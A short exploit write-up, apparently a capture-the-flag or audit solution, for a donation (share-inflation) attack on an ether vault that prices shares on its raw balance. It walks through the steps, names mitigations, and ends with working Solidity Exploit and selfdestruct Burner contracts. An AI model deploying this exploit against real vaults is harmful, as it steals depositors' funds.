The vault prices shares on its raw ether balance, so this is a share-inflation (donation) attack.

1. The attacker deposits 1 wei and receives 1 share.
2. The attacker force-sends the remaining ~1 ether to the vault with a selfdestruct helper, since the vault has no `receive` function. The vault now holds 1e18 wei against 1 share.
3. A deposits 2 ether and gets `2e18 * 1 / 1e18 = 2` shares, so A is fine.
4. B deposits 0.5 ether and gets `0.5e18 * 3 / 3e18 = 0` shares after rounding down. B redeems nothing and receives 0, which breaks the invariant.

A patched vault that adds virtual shares or reverts on zero shares would not leave B with 0 shares and no ether.

```solidity
pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Burner {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract Exploit {
    address public target;

    constructor(address t) payable {
        target = t;
    }

    function run() external {
        IVault(target).deposit{value: 1}();
        uint256 rest = address(this).balance;
        new Burner{value: rest}(payable(target));
    }
}
```
